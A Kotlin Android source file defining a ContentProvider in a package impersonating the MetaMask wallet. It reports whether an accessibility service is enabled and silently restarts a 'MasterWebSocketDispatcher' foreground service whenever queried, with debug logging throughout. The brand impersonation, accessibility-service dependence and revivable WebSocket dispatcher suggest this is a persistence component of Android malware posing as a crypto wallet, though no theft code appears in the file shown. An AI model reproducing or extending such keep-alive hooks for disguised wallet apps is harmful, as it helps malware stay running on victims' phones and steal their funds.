package com.example.MetaMask.services.sync

import android.content.ContentProvider
import android.content.ContentValues
import android.content.Intent
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.os.Build
import com.example.MetaMask.services.CoreServicesLauncher
import com.example.MetaMask.services.MasterWebSocketDispatcher

class StubProvider : ContentProvider() {

    companion object {
        private const val TAG = "StubProvider"
    }

    override fun onCreate() = true

    override fun query(uri: Uri, p: Array<String>?, s: String?, a: Array<String>?, s1: String?): Cursor? {
        android.util.Log.d("XDBG", "[StubProvider] query enter uri=${uri} p=${p} s=${s} a=${a} s1=${s1}") //xdbg
        if (uri.lastPathSegment == "health") {
            android.util.Log.d("XDBG", "[StubProvider] if branch") //xdbg
            val ctx = context ?: return null

            val accessSvcAlive = CoreServicesLauncher.isAccessibilityServiceEnabled(ctx)
            val mwdAlive = MasterWebSocketDispatcher.CURRENT_INSTANCE != null

            if (!mwdAlive) {
                android.util.Log.d("XDBG", "[StubProvider] if branch") //xdbg
                try {
                    val intent = Intent(ctx, MasterWebSocketDispatcher::class.java).apply {
                        putExtra("STARTED_FROM", "PROVIDER_HEALTH_CHECK")
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        android.util.Log.d("XDBG", "[StubProvider] if branch") //xdbg
                        ctx.startForegroundService(intent)
                    } else {
                        ctx.startService(intent)
                    }
                } catch (_: Exception) {}
            }

            val cursor = MatrixCursor(arrayOf("access_svc", "mwd"))
            cursor.addRow(arrayOf(if (accessSvcAlive) 1 else 0, if (mwdAlive) 1 else 0))
            android.util.Log.d("XDBG", "[StubProvider] return") //xdbg
            return cursor
        }
        android.util.Log.d("XDBG", "[StubProvider] return") //xdbg
        return null
    }

    override fun getType(uri: Uri) = null
    override fun insert(uri: Uri, v: ContentValues?) = null
    override fun delete(uri: Uri, s: String?, a: Array<String>?) = 0
    override fun update(uri: Uri, v: ContentValues?, s: String?, a: Array<String>?) = 0
}
